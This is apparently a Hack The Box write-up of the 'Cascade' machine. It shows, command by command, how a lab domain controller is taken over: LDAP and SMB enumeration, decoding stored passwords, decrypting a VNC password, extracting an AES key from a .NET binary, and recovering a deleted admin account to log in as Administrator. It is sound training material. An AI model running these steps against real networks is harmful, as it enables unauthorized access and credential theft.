![[Cascade.png]]

Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user `r.thompson`, which gives access to a `TightVNC` registry backup. The backup is decrypted to gain the password for `s.smith`. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the `ArkSvc` account. This account belongs to the `AD Recycle Bin` group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.

---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ nmap -T4 -p- -A 10.129.145.225
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 17:10:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.004 days (since Thu Feb 13 12:06:06 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

## Enumeration

### SMB

There don't seem to be any publicly accessible SMB shares, or any other services I can get into without credentials, so let's try enumerating through the SMB protocol.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ netexec smb 10.129.145.225 --users 
SMB         10.129.145.225  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.145.225  445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                                 
SMB         10.129.145.225  445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain                                                                      
SMB         10.129.145.225  445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.145.225  445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.145.225  445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.145.225  445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.145.225  445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.145.225  445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.145.225  445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.145.225  445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.145.225  445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.145.225  445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.145.225  445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.145.225  445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.145.225  445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.145.225  445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.145.225  445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
```

 Not a whole lot else I could get.  But hey, a user list, that's helpful!

```txt
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

### LDAP

Let's enumerate LDAP, starting with naming context.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ ldapsearch -H ldap://10.129.145.225 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

So far so good, let's take a look at users.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ ldapsearch -H ldap://10.129.145.225 -x -b "DC=cascade,DC=local" '(objectClass=user)'
[..snip..]
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
[..snip..]
```

Interesting field there at the bottom for `r.thompson` titled `cascadeLegacyPwd`. He's the only user with it.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

## Initial Access

### Check Credentials

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ netexec smb 10.129.145.225 -u r.thompson -p 'rY4n5eva'
SMB    10.129.145.225  445    CASC-DC1     [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB    10.129.145.225  445    CASC-DC1     [+] cascade.local\r.thompson:rY4n5eva
```

Looks like they're still valid credentials.  Let's keep seeing what we can do.

### SMB (again)

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ smbclient -L \\\\10.129.145.225\\ -U r.thompson%'rY4n5eva'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share
```

And now we see a share titled `Data`. After connecting, we have access to the following files:
* `\IT\Email Archives\Meeting_Notes_June_2018.html`
	* Temporary account, username is `TempAdmin` (same pass as normal admin).
* `\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log`
* `\IT\Logs\DCs\dcdiag.log`
* `\IT\Temp\s.smith\VNC Install.reg`
	* `TightVNC`
	* `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`
	* `"RfbPort"=dword:0000170c`
	* `"HttpPort"=dword:000016a8`

### VNC Password

Converting the VNC password hex into ASCII gives us a bunch of jibberish, maybe ciphertext. After a few Google searches, turns out that's what it is. A few more Google searches led me to this [tool](https://github.com/jeroennijhof/vncpwd) to help decrypt it.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ echo "6bcf2a4b6e5aca0f" | xxd -r -p > vnc_pass.enc

┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ /opt/vncpwd/vncpwd vnc_pass.enc 
Password: sT333ve2
```

Guessing since we found this in `s.smith`'s folder, the password might belong to him.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ netexec smb 10.129.145.225 -u s.smith -p 'sT333ve2'  
SMB    10.129.145.225  445    CASC-DC1       [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB    10.129.145.225  445    CASC-DC1       [+] cascade.local\s.smith:sT333ve2
```

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ evil-winrm -i 10.129.145.225 -u s.smith -p 'sT333ve2'            

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

## Shell as s.smith

### Enumeration

```PowerShell
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 7:58:05 PM
Password expires             Never
Password changeable          1/28/2020 7:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/28/2020 11:26:39 PM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Let's check out that logon script, `MapAuditDrive.vbs`

```PowerShell
*Evil-WinRM* PS C:\> Get-ChildItem -Path "C:\" -Recurse -Filter "MapAuditDrive.vbs"

	Directory: C:\Windows\SYSVOL\sysvol\cascade.local\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/15/2020   9:50 PM            258 MapAuditDrive.vbs

*Evil-WinRM* PS C:\Windows\SYSVOL\sysvol\cascade.local\scripts> cat MapAuditDrive.vbs
'MapAuditDrive.vbs
Option Explicit
Dim oNetwork, strDriveLetter, strRemotePath
strDriveLetter = "F:"
strRemotePath = "\\CASC-DC1\Audit$"
Set oNetwork = CreateObject("WScript.Network")
oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
WScript.Quit
```

### SMB (...again)

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ smbclient \\\\10.129.145.225\\Audit$ -U s.smith%'sT333ve2'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1619338 blocks available
```

I identified two files I wanted to take a look at for now:
* `\DB\Audit.db`
* `RunAudit.bat`
	* This just executes `CascAudit` with `Audit.db` as a parameter

### Audit.db

This is an SQLite database and it has some very interesting data in the `Ldap` table.

![[cascade1.png]]

`ArkSvc:BQO5l5Kj9MdErXx6Q6AGOw==`

Trying to decode that Base64 string produces nothing but jibberish (again), so it's likely encrypted. Maybe we'll have to go back and take a closer look at `CascAudit.exe` to see if there's any clues to decrypting it.

### CascAudit.exe

Viewing the executable in dnSpy, we see an interesting tidbit of code:

```C#
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
```

We then look at the `CascCrypto.dll` dependency, and find the `DecryptString` function. It has another helpful few tidbits for us:

```C#
aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
aes.Mode = CipherMode.CBC
```

Looks like we're using AES CBC, and now have the key and IV. Let's use good ol' Cyber Chef and decrypt our password.

![[cascade3.png]]

And now we've got a new set of credentials: `ArkSvc:w3lc0meFr31nd`

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ evil-winrm -i 10.129.145.225 -u ArkSvc -p 'w3lc0meFr31nd'        

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

## Shell as ArkSvc

### Enumeration

```PowerShell
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 4:18:20 PM
Password expires             Never
Password changeable          1/9/2020 4:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 9:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Once again, we see `AD Recycle Bin`, just like when we were looking at the SMB shares for `r.thompson` earlier. After some research, it seems this is a fairly common Windows group, and there might be a way to recover deleted items. Details can be found [here](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/).

## Privilege Escalation

### AD Recycle Bin

```PowerShell
*Evil-WinRM* PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects 


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

And look at that, there's the `TempAdmin` user in the AD Recycle Bin.

```PowerShell
*Evil-WinRM* PS C:\> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Another `cascadeLegacyPwd` value... let's decode.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```

### Shell as Administrator

Let's use our new credentials and see if they work for the Administrator account. The email we read during SMB enumeration before seems to indicate they will.

```sh
┌──(pl4stic㉿kali)-[~/htb/cascade]
└─$ evil-winrm -i 10.129.145.225 -u administrator -p 'baCT3r1aN00dles'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Grab that `root.txt` and be done!